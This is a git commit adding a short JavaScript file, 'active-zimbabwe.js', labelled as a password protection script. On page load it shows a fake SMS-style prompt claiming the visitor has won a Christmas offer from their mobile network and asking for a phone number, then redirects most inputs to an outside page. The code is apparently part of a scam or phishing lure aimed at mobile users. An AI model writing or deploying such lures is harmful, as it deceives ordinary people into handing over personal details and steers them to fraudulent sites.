e19a63c9f8c49d458d8a832026fe859dc5803098
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-20 10:49:37 +0100

    Create active-zimbabwe.js

---
+++ active-zimbabwe.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'GET XMAS OFFER'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive Christmas offer from your favourite network. Please press OK to Enter your Phone Number.',
+  'GET XMAS OFFER'
+);
+if (password != 'GET XMAS OFFER') {
+  location.href = 'https://lhegit.org/zimbabwe.html';
+}
